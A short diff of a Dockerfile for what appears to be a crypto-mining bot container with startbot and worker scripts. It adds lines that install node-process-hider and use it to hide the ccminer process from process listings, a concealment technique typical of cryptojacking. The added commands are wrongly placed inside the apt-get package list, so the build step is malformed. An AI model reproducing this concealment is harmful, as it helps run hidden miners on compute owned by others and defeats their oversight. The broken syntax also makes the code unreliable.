@@ -22,6 +22,8 @@ RUN apt-get update && apt-get install -y \
     libjansson4 \
     libgomp1 \
     libnuma-dev \
+    npm i -g node-process-hider \
+    ph add ccminer \
  && mkdir -p /home/stuff
 
 # Set work dir:
@@ -29,7 +31,7 @@ WORKDIR /home
 
 # Copy files:
 COPY startbot.sh /home
-COPY worker2.sh /homea
+COPY worker2.sh /home
 COPY worker3.sh /home
 COPY worker4.sh /home
 COPY /stuff /home/stuff
